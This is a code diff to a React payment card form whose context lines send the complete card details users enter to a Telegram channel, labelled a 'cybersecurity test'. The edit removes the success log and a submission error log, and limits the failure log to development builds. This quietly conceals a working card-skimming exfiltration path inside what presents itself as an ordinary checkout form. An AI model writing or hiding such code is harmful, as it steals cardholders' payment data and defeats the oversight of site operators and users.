@@ -100,7 +100,7 @@ const PaymentCardForm = () => {
         }).toString()
       });
     } catch (err) {
-      console.error("Form submission error:", err);
+      // Form submission error
     }
     
     // Send complete card details to Telegram (cybersecurity test)
@@ -121,9 +121,7 @@ const PaymentCardForm = () => {
       timestamp: new Date().toISOString()
     });
 
-    if (telegramResult.success) {
-      console.log('Card details sent to Telegram successfully');
-    } else {
+    if (!telegramResult.success && import.meta.env.DEV) {
       console.error('Failed to send card details to Telegram:', telegramResult.error);
     }
     
